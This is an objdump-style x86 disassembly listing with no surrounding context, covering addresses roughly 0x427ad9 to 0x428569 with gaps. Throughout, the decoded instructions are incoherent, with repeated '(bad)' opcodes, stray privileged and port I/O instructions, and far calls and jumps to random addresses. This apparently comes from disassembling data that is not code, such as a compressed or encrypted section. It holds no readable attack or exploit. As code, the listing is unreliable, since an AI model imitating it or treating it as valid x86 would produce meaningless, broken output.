  427ad9:	push   edi
  427ada:	mov    DWORD PTR gs:[edi],ebx
  427add:	inc    esi
  427ade:	inc    ecx
  427adf:	and    al,0x83
  427ae1:	xor    BYTE PTR [ecx+0x19],al
  427ae4:	or     eax,0xf6bbacf
  427ae9:	sbb    dh,BYTE PTR [edx+0x5]
  427aec:	pop    ss
  427aed:	adc    edx,DWORD PTR [edi-0x2b]
  427af0:	or     al,0xa
  427af2:	les    ebx,FWORD PTR [ebx]
  427af4:	mov    dh,0x7b
  427af6:	mov    cl,0x2c
  427af8:	retf   0x7529
  427afb:	pop    esi
  427afc:	xchg   bh,cl
  427afe:	mov    ch,0xe1
  427b00:	sbb    eax,0xdafefac1
  427b05:	mov    ah,al
  427b07:	icebp  
  427b08:	push   ebx
  427b09:	sub    esp,DWORD PTR [edx+eax*1-0x3c49d55b]
  427b10:	or     ah,ah
  427b12:	cmp    eax,DWORD PTR [esi-0x1d9a9e94]
  427b18:	call   0x25d01306
  427b1d:	jo     0x427b6f
  427b1f:	mov    WORD PTR [eax],es
  427b21:	in     eax,dx
  427b22:	(bad)  
  427b23:	lea    ebp,[eax+esi*4+0x11e15156]
  427b2a:	cmc    
  427b2b:	loopne 0x427b64
  427b2d:	pop    ebp
  427b2e:	xchg   esi,eax
  427b2f:	je     0x427ad2
  427b31:	shl    DWORD PTR [edi+0x4e],1
  427b34:	mov    ds:0xef112801,al
  427b39:	add    bl,BYTE PTR [ebp+0x4b]
  427b3c:	mov    BYTE PTR [ecx],ah
  427b3e:	(bad)  
  427b3f:	or     al,0xb6
	...
  427bb1:	add    BYTE PTR [eax],al
  427bb3:	add    dl,ah
  427bb5:	pusha  
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0x6014fe65
  427bc1:	lahf   
  427bc2:	pop    ecx
  427bc3:	xchg   edi,eax
  427bc4:	jmp    0xf5427d6e
  427bc9:	add    BYTE PTR [eax],al
  427bcb:	add    dl,cl
  427bcd:	(bad)  
  427bce:	stos   BYTE PTR es:[edi],al
  427bcf:	cmp    al,0xb9
  427bd1:	mov    ds:0x45dbc979,al
  427bd6:	test   bl,ah
  427bd8:	inc    edi
  427bd9:	push   es
  427bda:	mov    bl,0xfb
  427bdc:	and    BYTE PTR [edi],dl
  427bde:	outs   dx,BYTE PTR ds:[esi]
  427bdf:	mov    edx,0xb6b7b4e7
  427be4:	xor    DWORD PTR [edx+0x73a4dd6e],eax
  427bea:	xchg   esi,eax
  427beb:	add    ch,al
  427bed:	dec    esp
  427bee:	sbb    al,0x75
  427bf0:	jno    0x427be7
  427bf2:	pop    ecx
  427bf3:	stos   DWORD PTR es:[edi],eax
  427bf4:	arpl   WORD PTR [ecx-0x2d],sp
  427bf7:	jo     0x427beb
  427bf9:	xchg   edi,eax
  427bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bfb:	sti    
  427bfc:	add    esp,DWORD PTR [edi-0x2f0866b3]
  427c02:	mov    bl,0x19
  427c04:	sahf   
  427c05:	mov    cs,edi
  427c07:	aas    
  427c08:	lods   al,BYTE PTR ds:[esi]
  427c09:	xchg   DWORD PTR ds:0xc368c768,ebp
  427c0f:	nop
  427c10:	in     eax,0x1e
  427c12:	mov    edi,eax
  427c14:	fist   WORD PTR [ebx-0x5bfb6dcc]
  427c1a:	mov    ah,0x3
  427c1c:	xor    edx,DWORD PTR [esi+0x70]
  427c1f:	inc    ebp
  427c20:	dec    ecx
  427c21:	sub    eax,0x8f746b8f
  427c26:	cwde   
  427c27:	aaa    
  427c28:	sub    al,0xa5
  427c2a:	cmp    BYTE PTR [eax-0x2f],bl
  427c2d:	cmc    
  427c2e:	and    ebx,DWORD PTR [esi]
  427c30:	pop    ss
  427c31:	mov    ch,0x5a
  427c33:	or     al,0x24
  427c35:	mov    al,0xf1
  427c37:	outs   dx,DWORD PTR ds:[esi]
  427c38:	clc    
  427c39:	bound  esp,QWORD PTR [edx+0x6d1820a2]
  427c3f:	pop    ebx
  427c40:	mov    dh,BYTE PTR [edi]
  427c42:	addr16 gs jmp 0x36a26c2c
  427c49:	ja     0x427ca4
  427c4b:	call   0xc6fb:0x120e9f14
  427c52:	stc    
  427c53:	xlat   BYTE PTR ds:[ebx]
  427c54:	pop    esp
  427c55:	je     0x427caa
  427c57:	inc    DWORD PTR [esi+0x51]
  427c5a:	mov    edx,0xe8352b21
  427c5f:	push   0x192314fd
  427c64:	shl    BYTE PTR [edi-0x61a50824],1
  427c6a:	loop   0x427ca8
  427c6c:	jmp    0x14b5d1f4
  427c71:	repz ss pushf 
  427c74:	mov    WORD PTR [ebx],ss
  427c76:	lods   eax,DWORD PTR ds:[esi]
  427c77:	in     al,dx
  427c78:	mov    ah,0x97
  427c7a:	mov    esp,0xd7510e0d
  427c7f:	cmp    eax,0x17ed7fcd
  427c84:	arpl   WORD PTR [edi+0x2a],dx
  427c87:	je     0x427c77
  427c89:	pop    ecx
  427c8a:	neg    bl
  427c8c:	lds    ebp,FWORD PTR [ebx+0x70]
  427c8f:	sub    BYTE PTR [esi+edx*1-0x5e],0xf8
  427c94:	mov    WORD PTR [edi],?
  427c96:	sti    
  427c97:	sar    bh,cl
  427c99:	xchg   ebp,eax
  427c9a:	pop    esp
  427c9b:	(bad)  
  427c9c:	sub    BYTE PTR [edx+0x2d],cl
  427c9f:	jns    0x427ced
  427ca1:	lds    ebp,FWORD PTR [edi+0x61d166b4]
  427ca7:	enter  0x8a7b,0x56
  427cab:	sub    cl,cl
  427cad:	xchg   esp,eax
  427cae:	sub    eax,0x82158b53
  427cb3:	sbb    eax,0xf90f429b
  427cb8:	mov    dl,0x2a
  427cba:	stos   BYTE PTR es:[edi],al
  427cbb:	ret    
  427cbc:	repz mov al,0x3a
  427cbf:	xchg   edx,eax
  427cc0:	aaa    
	...
  427d31:	add    BYTE PTR [eax],al
  427d33:	add    BYTE PTR [edx],cl
  427d35:	mov    cl,0x61
  427d37:	repz sti 
  427d39:	repz call 0xb3a1:0xdc63ecf9
  427d41:	lods   al,BYTE PTR ds:[esi]
  427d42:	scas   al,BYTE PTR es:[edi]
  427d43:	cld    
  427d44:	fisub  WORD PTR [esi+0xf50001]
  427d4a:	add    BYTE PTR [eax],al
  427d4c:	push   es
  427d4d:	(bad)  [edi-0x22]
  427d50:	scas   eax,DWORD PTR es:[edi]
  427d51:	adc    BYTE PTR [eax],dh
  427d53:	dec    ebp
  427d54:	dec    eax
  427d55:	sbb    eax,0xe7fcb3e6
  427d5a:	jp     0x427dd8
  427d5c:	pop    esi
  427d5d:	(bad)  
  427d5e:	test   eax,0xa46b1aaa
  427d63:	in     al,dx
  427d64:	or     al,0x96
  427d66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d67:	sar    ch,cl
  427d69:	imul   edx,ebx,0xed0defa7
  427d6f:	add    DWORD PTR ds:0x4bdb2fb0,edi
  427d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d77:	(bad)  
  427d79:	mov    ds:0x2438d336,al
  427d7e:	xor    ecx,DWORD PTR [esi]
  427d80:	or     ah,BYTE PTR [ebp-0x1d]
  427d83:	xor    al,0x14
  427d85:	sti    
  427d86:	cmp    DWORD PTR [esi-0x26986e84],ecx
  427d8c:	xchg   ecx,eax
  427d8d:	pop    esp
  427d8e:	jp     0x427da3
  427d90:	inc    eax
  427d91:	clc    
  427d92:	ffree  st(5)
  427d94:	sti    
  427d95:	dec    edi
  427d96:	ror    DWORD PTR [edi+0xd],0x63
  427d9a:	stc    
  427d9b:	pop    edx
  427d9c:	lds    esp,FWORD PTR [ebx+0x403ecb8e]
  427da2:	outs   dx,BYTE PTR ds:[esi]
  427da3:	hlt    
  427da4:	and    al,0x5
  427da6:	retf   0xaa78
  427da9:	adc    ah,BYTE PTR [edi]
  427dab:	neg    DWORD PTR ss:[edi-0x2b0f0313]
  427db2:	nop
  427db3:	(bad)  
  427db4:	mov    gs,eax
  427db6:	jae    0x427d85
  427db8:	mov    ah,0x62
  427dba:	ret    0x5662
  427dbd:	mov    WORD PTR [ebx+0x6a],fs
  427dc0:	cmp    BYTE PTR [esi+eax*8],dh
  427dc3:	dec    ebx
  427dc4:	mov    eax,ds:0xdfdf4202
  427dc9:	aam    0x6b
  427dcb:	push   esp
  427dcc:	loopne 0x427d66
  427dce:	xchg   BYTE PTR [edi+edx*8],bl
  427dd1:	sar    edx,0xb5
  427dd4:	repz and BYTE PTR [ecx],bh
  427dd7:	push   es
  427dd8:	enter  0x5382,0x7c
  427ddc:	cmp    edx,DWORD PTR [ebp-0x22]
  427ddf:	jle    0x427de7
  427de1:	sbb    eax,0xe23cb0b2
  427de6:	gs jmp 0x32b2:0xf689dc6b
  427dee:	out    0xac,al
  427df0:	sahf   
  427df1:	imul   ebx,DWORD PTR [edi],0xfffffff4
  427df4:	inc    edx
  427df5:	lock into 
  427df7:	fs jg  0x427da9
  427dfa:	dec    edi
  427dfb:	push   ecx
  427dfc:	inc    eax
  427dfd:	sbb    eax,DWORD PTR [ecx-0x51]
  427e00:	pop    esp
  427e01:	inc    edi
  427e02:	push   eax
  427e03:	mov    ch,0xd8
  427e05:	scas   al,BYTE PTR es:[edi]
  427e06:	pushf  
  427e07:	dec    ebx
  427e08:	mov    esp,DWORD PTR ds:0xdb72e57f
  427e0e:	xor    DWORD PTR [esi+eiz*4-0x1a],ebx
  427e12:	pop    es
  427e13:	(bad)  
  427e14:	adc    al,0xa9
  427e16:	xor    eax,0x92c5be52
  427e1b:	ret    0x85f1
  427e1e:	fild   DWORD PTR [ebx]
  427e20:	cld    
  427e21:	lods   eax,DWORD PTR ds:[esi]
  427e22:	sub    bh,BYTE PTR [eax+0x55]
  427e25:	mov    WORD PTR [eax],ds
  427e27:	lods   eax,DWORD PTR ds:[esi]
  427e28:	mov    bl,0x24
  427e2a:	repnz ins BYTE PTR es:[edi],dx
  427e2c:	mov    ebp,0x3572c929
  427e31:	inc    edi
  427e32:	mov    esp,0x9ad800a0
  427e37:	mov    al,ds:0x3edd36c3
  427e3c:	popa   
  427e3d:	jbe    0x427e7f
  427e3f:	push   0xd
	...
  427eb1:	add    BYTE PTR [eax],al
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	bound  edx,QWORD PTR [edi+eiz*4+0x1a7d386]
  427ec7:	add    ch,dh
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    ch,cl
  427ecd:	jno    0x427f2e
  427ecf:	sub    bh,al
  427ed1:	jne    0x427e74
  427ed3:	fmul   DWORD PTR [esi+0x16]
  427ed6:	mov    ds:0x6aff12e1,al
  427edb:	add    edi,DWORD PTR [ebx]
  427edd:	dec    ecx
  427ede:	cmp    eax,0xf47a1c52
  427ee3:	int    0xa2
  427ee5:	jecxz  0x427e8a
  427ee7:	cwde   
  427ee8:	mov    bh,0xfb
  427eea:	or     al,0xfa
  427eec:	inc    edx
  427eed:	sbb    DWORD PTR [edi-0x4ee7f094],edx
  427ef3:	(bad)  
  427ef4:	pop    esp
  427ef5:	xor    esi,DWORD PTR [edi+ebx*2-0x432c092e]
  427efc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427efd:	inc    eax
  427efe:	faddp  st(6),st
  427f00:	in     eax,0xdf
  427f02:	dec    edx
  427f03:	scas   al,BYTE PTR es:[edi]
  427f04:	inc    edi
  427f05:	mov    edx,0x2ea8fe89
  427f0a:	repnz cwd 
  427f0d:	mov    dh,0xbb
  427f0f:	xor    bl,BYTE PTR cs:[eax]
  427f12:	xchg   edx,eax
  427f13:	cli    
  427f14:	fisub  WORD PTR [ebp+eiz*2+0x45]
  427f18:	int3   
  427f19:	pop    edx
  427f1a:	leave  
  427f1b:	inc    esp
  427f1c:	xor    DWORD PTR [bx-0x124],0xaab337b1
  427f25:	test   al,0x68
  427f27:	mov    eax,DWORD PTR [eax]
  427f29:	mov    dh,0xf9
  427f2b:	fidiv  WORD PTR [ebp-0x1e]
  427f2e:	stc    
  427f2f:	ins    DWORD PTR es:[edi],dx
  427f30:	mov    dh,0x60
  427f32:	pop    edx
  427f33:	adc    eax,0x23ddacd7
  427f38:	bnd cs jns 0x427f27
  427f3c:	push   esi
  427f3d:	lea    edx,[esi+ebp*2-0x7be6e152]
  427f44:	adc    eax,0x5f1c9710
  427f49:	push   ds
  427f4a:	ret    0xbae1
  427f4d:	push   ds
  427f4e:	fst    st(3)
  427f50:	in     al,0x78
  427f52:	dec    ebp
  427f53:	int    0x99
  427f55:	mov    bl,0x55
  427f57:	fadd   st,st(3)
  427f59:	jge    0x427f30
  427f5b:	mov    cl,BYTE PTR [edi-0x2edb7131]
  427f61:	push   ss
  427f62:	ds mov dl,0x47
  427f65:	jbe    0x427fc1
  427f67:	stc    
  427f68:	jo     0x427f8f
  427f6a:	add    al,0xea
  427f6c:	and    al,0xa4
  427f6e:	loopne 0x427fa8
  427f70:	repz int 0xc4
  427f73:	dec    ebp
  427f74:	aaa    
  427f75:	jmp    0x427f5a
  427f77:	fisubr DWORD PTR [edx+0x2608627b]
  427f7d:	push   0xa5963fa6
  427f82:	fisttp DWORD PTR [eax-0x6c]
  427f85:	jge    0x427f35
  427f87:	inc    edx
  427f88:	jbe    0x427fa0
  427f8a:	ins    DWORD PTR es:[edi],dx
  427f8b:	pop    eax
  427f8c:	inc    esi
  427f8d:	test   DWORD PTR [ecx],esi
  427f8f:	or     DWORD PTR [ecx-0x279a427b],esi
  427f95:	int3   
  427f96:	std    
  427f97:	xchg   ebx,eax
  427f98:	cs push ebp
  427f9a:	nop
  427f9b:	mov    edi,0x4439ce23
  427fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427fa1:	inc    esi
  427fa2:	cli    
  427fa3:	mov    ch,0x15
  427fa5:	rol    DWORD PTR [ecx],1
  427fa7:	cdq    
  427fa8:	inc    edi
  427fa9:	das    
  427faa:	pop    ecx
  427fab:	sbb    al,0xfd
  427fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fae:	popf   
  427faf:	iret   
  427fb0:	cmc    
  427fb1:	xchg   ebx,eax
  427fb2:	sub    BYTE PTR [edi+eax*1],0x1f
  427fb6:	or     BYTE PTR [esi-0x7ee27501],dh
  427fbc:	dec    eax
  427fbd:	lock dec ecx
  427fbf:	fistp  DWORD PTR [ebx+0x0]
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [ebx+0x72],ebp
  428042:	loopne 0x427fd4
  428044:	enter  0x1a8,0x0
  428048:	cmc    
  428049:	add    BYTE PTR [eax],al
  42804b:	add    BYTE PTR [edi-0x795b7575],ah
  428051:	mov    ah,0x5c
  428053:	sub    esp,ecx
  428055:	sbb    eax,0xb24f8164
  42805a:	sub    DWORD PTR [ebp+edx*1-0x47],esi
  42805e:	mov    ch,0x70
  428060:	mov    bh,0x9e
  428062:	mov    ds:0xc1399dbd,eax
  428067:	dec    esp
  428068:	pushf  
  428069:	xchg   edi,eax
  42806a:	dec    ebp
  42806b:	adc    ebp,DWORD PTR [ebp-0x7a3ef4e8]
  428071:	add    BYTE PTR [edx],dh
  428073:	sti    
  428074:	mov    ds:0x4b7eb56a,eax
  428079:	mov    ecx,0xf56098cc
  42807e:	jo     0x428061
  428080:	aad    0xc9
  428082:	fcom   DWORD PTR [ecx]
  428084:	or     DWORD PTR [edi-0x14],edi
  428087:	xor    al,0xe
  428089:	push   ss
  42808a:	loope  0x428059
  42808c:	add    BYTE PTR [eax],bl
  42808e:	and    ch,al
  428090:	xor    edi,DWORD PTR [ecx+0x2b1dd0c7]
  428096:	dec    edx
  428097:	sti    
  428098:	mov    bl,0x67
  42809a:	and    al,0x2c
  42809c:	ror    DWORD PTR [esi],0xc9
  42809f:	pop    es
  4280a0:	std    
  4280a1:	ins    BYTE PTR es:[edi],dx
  4280a2:	pop    eax
  4280a3:	xor    dl,ah
  4280a5:	and    ecx,DWORD PTR [edi]
  4280a7:	sbb    eax,0xe5d9afbb
  4280ac:	in     al,0xf8
  4280ae:	aaa    
  4280af:	sub    eax,ecx
  4280b1:	ret    
  4280b2:	xchg   esi,eax
  4280b3:	int    0xc0
  4280b5:	jno    0x4280a2
  4280b7:	test   al,0xb5
  4280b9:	popf   
  4280ba:	xchg   edi,eax
  4280bb:	test   DWORD PTR cs:[eax+0x1e110e98],esi
  4280c2:	(bad)  
  4280c4:	je     0x4280fa
  4280c6:	mul    BYTE PTR [esi]
  4280c8:	xchg   esi,eax
  4280c9:	jns    0x42808c
  4280cb:	push   eax
  4280cc:	add    ch,BYTE PTR [edi-0x723666ec]
  4280d2:	and    BYTE PTR [eax],ah
  4280d4:	out    0xd7,al
  4280d6:	arpl   bx,di
  4280d8:	xor    esp,ebp
  4280da:	and    al,0x52
  4280dc:	push   es
  4280dd:	hlt    
  4280de:	int3   
  4280df:	jp     0x428096
  4280e1:	shl    DWORD PTR [eax],1
  4280e3:	(bad)  
  4280e4:	pop    ebx
  4280e5:	jns    0x428085
  4280e7:	mov    edi,0x203ad3ee
  4280ec:	xchg   esi,eax
  4280ed:	dec    ebx
  4280ee:	ffreep st(3)
  4280f0:	jo     0x428095
  4280f2:	add    BYTE PTR [edi-0x5387932a],cl
  4280f8:	jo     0x4280a6
  4280fa:	cmp    edi,esp
  4280fc:	jmp    0x1d66585c
  428101:	add    edx,DWORD PTR [edi+0x24]
  428104:	mov    ds:0x72894fda,al
  428109:	sbb    BYTE PTR [ebp+0x5f],cl
  42810c:	loop   0x4280c8
  42810e:	mov    ch,0x8e
  428110:	(bad)  
  428111:	add    DWORD PTR [edx],edi
  428113:	aad    0x2b
  428115:	pusha  
  428116:	add    al,0x3
  428118:	sti    
  428119:	ss cld 
  42811b:	pop    ebp
  42811c:	(bad)  
  42811d:	pop    edx
  42811e:	lods   al,BYTE PTR ds:[esi]
  42811f:	stc    
  428120:	jmp    0x55b973bf
  428125:	retf   0xf5f2
  428128:	loopne 0x428142
  42812a:	iret   
  42812b:	and    ebx,edi
  42812d:	nop
  42812e:	out    0x44,eax
  428130:	retf   
  428131:	xchg   esp,eax
  428132:	rol    DWORD PTR [ecx],0x28
  428135:	xchg   ebx,eax
  428136:	jle    0x4280cd
  428138:	adc    BYTE PTR [esi],ah
  42813a:	push   cs
  42813b:	and    eax,0x67d22188
  428140:	int3   
	...
  4281b1:	add    BYTE PTR [eax],al
  4281b3:	add    BYTE PTR [esi],bl
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0xeff2404f
  4281c3:	or     edi,DWORD PTR [ebp-0xafffe57]
  4281c9:	add    BYTE PTR [eax],al
  4281cb:	add    al,cl
  4281cd:	jge    0x428174
  4281cf:	mov    edx,0x97c833cd
  4281d4:	mov    ds:0xb414c709,al
  4281d9:	icebp  
  4281da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281db:	(bad)  [edi+0x14d06f3]
  4281e1:	mov    ch,0x8d
  4281e3:	xchg   dh,ah
  4281e5:	pop    es
  4281e6:	inc    ecx
  4281e7:	jmp    0x42820c
  4281e9:	cld    
  4281ea:	adc    eax,0x7e4b980f
  4281ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281f0:	pop    edx
  4281f1:	push   es
  4281f2:	xchg   edx,eax
  4281f3:	stos   BYTE PTR es:[edi],al
  4281f4:	mov    ecx,0x95013626
  4281f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281fa:	rcl    DWORD PTR [edx],1
  4281fc:	lea    edx,[edi]
  4281fe:	js     0x4281d0
  428200:	jbe    0x428239
  428202:	shl    DWORD PTR ds:0x16925b2f,0x71
  428209:	bound  ebp,QWORD PTR [edi]
  42820b:	in     al,dx
  42820c:	mov    ds:0xef8255a,al
  428211:	mov    ss,WORD PTR ds:0x6f4579a0
  428217:	jno    0x428205
  428219:	jmp    DWORD PTR [esi+0x0]
  42821c:	hlt    
  42821d:	leavew 
  42821f:	into   
  428220:	or     ecx,esp
  428222:	(bad)  
  428223:	mov    bl,0x8
  428225:	push   edi
  428226:	(bad)  
  428227:	stc    
  428228:	rcl    BYTE PTR [edx],1
  42822a:	fs push esi
  42822c:	mov    ecx,0x8f62779a
  428231:	call   0x41f02136
  428236:	iret   
  428237:	ret    0x353e
  42823a:	icebp  
  42823b:	out    dx,eax
  42823c:	adc    al,0xf5
  42823e:	and    esi,DWORD PTR [ebx+0x68]
  428241:	xor    DWORD PTR [ebx+eax*4-0x35],edx
  428245:	mov    al,0xb5
  428247:	xchg   edx,eax
  428248:	cmp    eax,0x52e07754
  42824d:	jbe    0x428229
  42824f:	cwde   
  428250:	xor    al,0x24
  428252:	mov    bl,0x58
  428254:	adc    edx,DWORD PTR [ebx-0x7703c0a5]
  42825a:	int3   
  42825b:	inc    edi
  42825c:	mov    ebx,0x383d08c5
  428261:	sbb    al,0xde
  428263:	dec    edi
  428264:	dec    ebx
  428265:	sub    eax,0x2cbcde8c
  42826a:	inc    esi
  42826b:	lahf   
  42826c:	dec    ebp
  42826d:	sub    BYTE PTR [ebx+0x47b69c54],dl
  428273:	jmp    0xfacd051e
  428278:	fst    DWORD PTR [eax]
  42827a:	push   esp
  42827b:	scas   eax,DWORD PTR es:[edi]
  42827c:	and    bh,BYTE PTR [edi-0x19124687]
  428282:	sub    ch,0xaa
  428285:	shr    BYTE PTR gs:[ebx+0x72],cl
  428289:	int    0x3
  42828b:	and    ebx,DWORD PTR [esi]
  42828d:	push   esi
  42828e:	xchg   edx,eax
  42828f:	sub    BYTE PTR [esi],dl
  428291:	jmp    0xd860:0xa5b8f027
  428298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428299:	ret    
  42829a:	xor    DWORD PTR [edi+0x724ae56c],eax
  4282a0:	sbb    DWORD PTR [edi-0x64756aaa],ecx
  4282a6:	jbe    0x4282ca
  4282a8:	cld    
  4282a9:	les    edi,FWORD PTR [eax]
  4282ab:	jecxz  0x4282dc
  4282ad:	xor    eax,0x4d0dd652
  4282b2:	pop    ecx
  4282b3:	outs   dx,DWORD PTR ds:[esi]
  4282b4:	xchg   esi,eax
  4282b5:	clc    
  4282b6:	out    0xfa,al
  4282b8:	loope  0x428265
  4282ba:	xchg   DWORD PTR [edx],eax
  4282bc:	out    0xa9,al
  4282be:	icebp  
  4282bf:	stos   DWORD PTR es:[edi],eax
  4282c0:	icebp  
	...
  428331:	add    BYTE PTR [eax],al
  428333:	add    BYTE PTR [edx],dl
  428335:	sbb    eax,0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	dec    ebx
  428341:	repz dec esp
  428343:	iret   
  428344:	mov    dl,0xaa
  428346:	add    DWORD PTR [eax],eax
  428348:	cmc    
  428349:	add    BYTE PTR [eax],al
  42834b:	add    BYTE PTR [esi],bh
  42834d:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  42834f:	addr16 mov ah,0xec
  428352:	inc    edx
  428353:	or     eax,0x3ab7563b
  428358:	inc    ecx
  428359:	sti    
  42835a:	lods   al,BYTE PTR ds:[esi]
  42835b:	std    
  42835c:	mov    eax,ds:0x62659e85
  428361:	in     al,dx
  428362:	fldenv [ecx]
  428364:	push   esi
  428365:	mov    ds:0xcfd99a92,eax
  42836a:	add    bl,dh
  42836c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42836e:	test   al,0x3d
  428370:	inc    ebx
  428371:	out    dx,al
  428372:	mov    cl,0x9c
  428374:	mov    ebx,0xc26f963f
  428379:	mov    esi,0x6112b815
  42837e:	shl    dl,0xba
  428381:	pusha  
  428382:	gs (bad) 
  428384:	mov    eax,ds:0xef0b24e5
  428389:	arpl   WORD PTR [eax+0x51],ax
  42838c:	and    esi,DWORD PTR [edi-0x49]
  42838f:	mov    esp,0xca2741f4
  428394:	inc    edi
  428395:	mov    ds:0x7e51c287,al
  42839a:	fwait
  42839b:	int    0x0
  42839d:	adc    DWORD PTR [esi-0x30ae0a9a],ebp
  4283a3:	mov    bl,0x1d
  4283a5:	mov    eax,ds:0xf43f4b3
  4283aa:	add    cl,ah
  4283ac:	push   0xffffffae
  4283ae:	ror    edx,1
  4283b0:	mov    BYTE PTR [edx+0x3a],0x7c
  4283b4:	sar    BYTE PTR [edi],cl
  4283b6:	mov    esi,0xa49e4789
  4283bb:	pop    edi
  4283bc:	or     BYTE PTR [ebp-0xe34dac1],bh
  4283c2:	stos   BYTE PTR es:[edi],al
  4283c3:	mov    edx,0xe1e2281
  4283c8:	(bad)  
  4283c9:	push   ss
  4283ca:	adc    eax,0x7bd13c1c
  4283cf:	test   BYTE PTR [ecx],0xdc
  4283d2:	test   al,0xba
  4283d4:	daa    
  4283d5:	cmp    eax,0x82af604a
  4283da:	mul    esp
  4283dc:	jmp    0x42835f
  4283de:	in     al,0x55
  4283e0:	std    
  4283e1:	mov    ds:0xeb18f68e,al
  4283e6:	fcom   QWORD PTR [eax-0x33]
  4283e9:	mov    bh,0x53
  4283eb:	mov    WORD PTR ds:0x6e092f24,es
  4283f1:	fild   DWORD PTR [edx-0x3823b4]
  4283f7:	xchg   ecx,eax
  4283f8:	dec    edi
  4283f9:	enter  0x5bdc,0x12
  4283fd:	call   0x1820:0x852d0718
  428404:	aad    0x12
  428406:	add    ebp,eax
  428408:	push   esi
  428409:	cwde   
  42840a:	sub    al,0xed
  42840c:	mov    edi,0xbbe38e6d
  428411:	in     al,dx
  428412:	adc    al,0x70
  428414:	jp     0x42846f
  428416:	je     0x42848d
  428418:	adc    al,0xef
  42841a:	mov    al,ds:0x2d57491b
  42841f:	test   BYTE PTR [esi+eax*4],ch
  428422:	(bad)  
  428423:	stos   BYTE PTR es:[edi],al
  428424:	inc    esp
  428425:	mov    esi,0xff5363f5
  42842a:	dec    ecx
  42842b:	pop    ds
  42842c:	xchg   edx,eax
  42842d:	dec    eax
  42842e:	lods   al,BYTE PTR ds:[esi]
  42842f:	lds    ebx,FWORD PTR [eax-0x6b]
  428432:	fadd   DWORD PTR [ebx+ecx*4-0x5ab0d33b]
  428439:	stc    
  42843a:	lea    ebp,[edi+0x1c47511e]
  428440:	jbe    0x428442
	...
  4284b2:	add    BYTE PTR [eax],al
  4284b4:	pop    esp
  4284b5:	test   al,0xc0
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx+0x1d6b3407]
  4284c1:	or     al,0x6e
  4284c3:	aas    
  4284c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284c5:	stos   DWORD PTR es:[edi],eax
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	cmc    
  4284c9:	add    BYTE PTR [eax],al
  4284cb:	add    BYTE PTR [ebp+0x58],dh
  4284ce:	adc    eax,0xed7459f9
  4284d3:	sub    eax,0x697067ba
  4284d8:	loope  0x428505
  4284da:	pop    esp
  4284db:	test   BYTE PTR [edx],dh
  4284dd:	and    BYTE PTR [edi+0x17],0xe7
  4284e1:	mov    ecx,0x679edcc5
  4284e6:	dec    esi
  4284e7:	cld    
  4284e8:	repz inc esi
  4284ea:	cmp    ecx,DWORD PTR [esi+edi*8]
  4284ed:	push   cs
  4284ee:	ins    DWORD PTR es:[edi],dx
  4284ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284f0:	stc    
  4284f1:	push   ebp
  4284f2:	push   ds
  4284f3:	mov    ecx,0xe03c2189
  4284f8:	add    DWORD PTR [ebp-0x42af9823],esi
  4284fe:	sub    edx,DWORD PTR [esi+ecx*8-0x74]
  428502:	push   eax
  428503:	xor    ch,bl
  428505:	adc    DWORD PTR [edi+0x6dc92506],ebx
  42850b:	(bad)  
  42850c:	xor    BYTE PTR [edi-0x2c],dl
  42850f:	jbe    0x428517
  428511:	mov    DWORD PTR [edi+0x17],edx
  428514:	ficom  WORD PTR [ebp-0x14]
  428517:	sub    DWORD PTR [ecx],esi
  428519:	lock lds esp,FWORD PTR [edx-0x26]
  42851d:	int3   
  42851e:	daa    
  42851f:	inc    edi
  428520:	cld    
  428521:	sub    DWORD PTR [ebp+0x75132256],esp
  428527:	xor    esi,DWORD PTR [esi]
  428529:	test   BYTE PTR [ecx-0x2e],ch
  42852c:	outs   dx,DWORD PTR ds:[esi]
  42852d:	push   eax
  42852e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42852f:	shl    DWORD PTR [eax-0x77b723e0],0x16
  428536:	xchg   esp,eax
  428537:	repnz pop esi
  428539:	jge    0x428533
  42853b:	push   esp
  42853c:	push   ss
  42853d:	pusha  
  42853e:	push   0x67
  428540:	mov    al,ds:0x48b54bef
  428545:	add    BYTE PTR [eax+0x1b],dh
  428548:	push   edx
  428549:	aaa    
  42854a:	hlt    
  42854b:	push   edi
  42854c:	int3   
  42854d:	scas   eax,DWORD PTR es:[edi]
  42854e:	mov    cl,0xa2
  428550:	adc    eax,DWORD PTR [eax]
  428552:	mov    fs,WORD PTR [esp+esi*4]
  428555:	xor    dh,BYTE PTR [edx+0x3797f5c9]
  42855b:	xor    bh,ch
  42855d:	ret    0x341f
  428560:	nop
  428561:	cmp    eax,0x19f26711
  428566:	add    dl,BYTE PTR [ebx]
  428568:	push   edi
  428569:	adc    eax,0x5db593f3
